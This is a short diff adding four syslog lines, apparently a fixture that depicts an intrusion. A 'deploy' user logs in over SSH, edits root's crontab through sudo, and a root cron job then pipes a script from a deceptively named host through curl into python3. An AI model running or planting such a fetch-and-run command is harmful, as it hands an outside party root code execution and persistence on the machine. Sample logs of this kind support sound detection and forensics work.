@@ -1,0 +1,4 @@
+Jan 15 11:05:42 app-node sshd[18402]: Accepted publickey for deploy from 10.0.1.45 port 49120 ssh2: RSA SHA256:k7d9F...
+Jan 15 11:06:15 app-node sudo[18455]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e
+Jan 15 11:06:40 app-node crontab[18470]: (root) REPLACE (root)
+Jan 15 11:07:01 app-node CRON[18485]: (root) CMD (curl -fsSL https://cdn.package-mirror-update.org/bootstrap.sh | python3 -)
